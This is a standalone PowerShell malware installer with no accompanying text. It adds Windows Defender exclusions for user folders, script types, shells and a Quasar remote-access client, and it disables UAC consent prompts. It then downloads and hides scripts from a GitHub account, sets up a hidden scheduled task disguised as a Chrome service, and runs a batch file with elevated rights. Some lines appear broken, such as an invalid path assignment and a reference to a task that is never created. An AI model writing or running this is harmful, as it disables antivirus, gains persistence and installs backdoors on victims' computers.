Add-MpPreference -ExclusionPath "$env:userprofile" -Force
Add-MpPreference -ExclusionPath "$env:appdata" -Force
Add-MpPreference -ExclusionPath "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup" -Force
Add-MpPreference -ExclusionPath "$env:appdata\Microsoft" -Force
Add-MpPreference -ExclusionExtension ".ps1" -Force
Add-MpPreference -ExclusionExtension ".bat" -Force
Add-MpPreference -ExclusionExtension ".exe" -Force
Add-MpPreference -ExclusionExtension ".vbs" -Force
Add-MpPreference -ExclusionProcess "powershell.exe" -Force
Add-MpPreference -ExclusionProcess "cmd.exe" -Force
Add-MpPreference -ExclusionProcess "Client.exe" -Force
Add-MpPreference -ExclusionProcess "Quasar-Client.exe" -Force
Add-MpPreference -ExclusionProcess "NvidiaCoreComponent.exe" -Force
Add-MpPreference -ExclusionProcess "NvidiaCore.exe" -Force
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
New-Item -ItemType "directory" -Path "$env:appdata\Chrome"
$home = $env:appdata\Chrome
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile $home\email.ps1

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.bat' -OutFile $home\backdrop.bat

if(Test-Path -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs){
Remove-Item -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs -Force
}

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/sec.vbs' -OutFile $home\sec.vbs



attrib +h "$home\sec.vbs"
attrib +h "$home\email.ps1"
attrib +h "$home\backdrop.bat"

schtasks /create /sc minute /mo 50 /tn "ChromeBackgroundService" /tr "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $home\sec.vbs'" /f

Set-ScheduledTask -TaskName "NvidiaUpdate" -User "NT AUTHORITY\SYSTEM"

start-process "cmd.exe" "/c %appdata%\Microsoft\backdrop.bat" -WindowStyle Hidden -Verb RunAs
